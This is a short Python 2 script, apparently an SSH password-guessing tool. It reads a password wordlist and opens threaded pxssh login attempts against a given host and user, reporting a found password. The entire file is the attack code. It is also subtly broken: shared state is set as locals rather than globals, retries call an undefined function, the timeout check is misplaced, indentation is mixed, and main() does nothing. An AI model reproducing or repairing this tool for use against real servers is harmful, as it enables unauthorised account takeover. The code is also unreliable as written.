#!/usr/bin/python

import pxssh
import optparse
import time
from threading import *

class bSsh:
	def connect(self, host, user, password, release):
		global Found
		global Fails
		global connection_lock

		try:
			s = pxssh.pxssh()
			s.login(host, user, password)
			print '[+] Password Found: ' + password
			Found = True
		except Exception, e:
			if 'read_nonblocking' in str(e):
				Fails += 1
				time.sleep(5)
				connect(host, user, password, False)
			elif 'synchronize with original prompt' in str(e):
				time.sleep(1)
				connect(host, user, password, False)
		finally:
			if release:
				connection_lock.release()

	def checkMe(self, myHost, myUser, myDict):
                maxConnections = 5
                connection_lock = BoundedSemaphore(value=maxConnections)
                Found = False
                Fails = 0

	        fn = open(myDict, 'r')
        	for line in fn.readlines():
	                if Found:
        	                print "[*] Exiting: Password Found"
                	        exit(0)
                        	if Fails > 5:
                                	print "[!] Exiting: Too Many Socket Timeouts"
	                                exit(0)
        	        connection_lock.acquire()
                	password = line.strip('\r').strip('\n')
	                print "[-] Testing: " + str(password)
        	        t = Thread(target=self.connect, args=(myHost, myUser, password, True))
                	child = t.start()

def main():
	exit(0)

if __name__ == '__main__':
	main()
